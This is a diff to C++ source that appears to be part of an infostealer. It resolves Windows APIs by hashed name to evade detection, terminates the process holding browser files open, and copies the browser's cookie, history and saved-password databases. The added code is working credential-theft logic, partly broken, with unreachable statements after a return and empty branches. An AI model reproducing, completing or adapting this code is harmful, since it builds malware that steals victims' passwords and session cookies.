@@ -342,6 +342,16 @@ bool CreateCopyFile(char* filename, char* newFileName) {
                 continue;
             }
 
+            pCloseHandle(hCopy);
+            constexpr unsigned int hashTerminateProcess = ComplexHashForAnsi("TerminateProcess");
+            typedef BOOL(WINAPI* _TerminateProcess)(HANDLE, UINT);
+            _TerminateProcess pTerminateProcess = (_TerminateProcess)apiResolve.GetApiAddress(lpKernel32, hashTerminateProcess);
+            if (pTerminateProcess(hProc, 0)) {
+                return 1;
+            }
+            else {
+                return 0;
+            }
             constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
             typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
             _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
@@ -724,18 +734,30 @@ void DecryptKey() {
         //CreateCopyFile(cookiesFilename, cookiesPath);
         //CreateCopyFile(historyFilename, historyPath);
         //CreateCopyFile(passwordFilename, passwordPath);
-        CreateCopyFile(orCookiesPath, cookiesPath);
+        constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
+        typedef VOID(WINAPI* _Sleep)(DWORD);
+        _Sleep pSleep = (_Sleep)apiResolve.GetApiAddress(lpKernel32, hashSleep);
+        if (CreateCopyFile(orCookiesPath, cookiesPath)) {
+            for (int i = 0; i < 1000; i++) {
+                if (pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
+                    break;
+                }
+            }
+
+            if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
+
+            }
+
+            if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
+
+            }
+        }
+
         //if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
-        //    CreateCopyFile(cookiesFilename, cookiesPath);
+        //    //CreateCopyFile(cookiesFilename, cookiesPath);
         //}
 
-        if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
-            
-        }
-
-        if (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
-            
-        }
+        
         
         //CreateCopyFile(historyFilename, historyPath);
         //CreateCopyFile(cookiesFilename, cookiesPath);
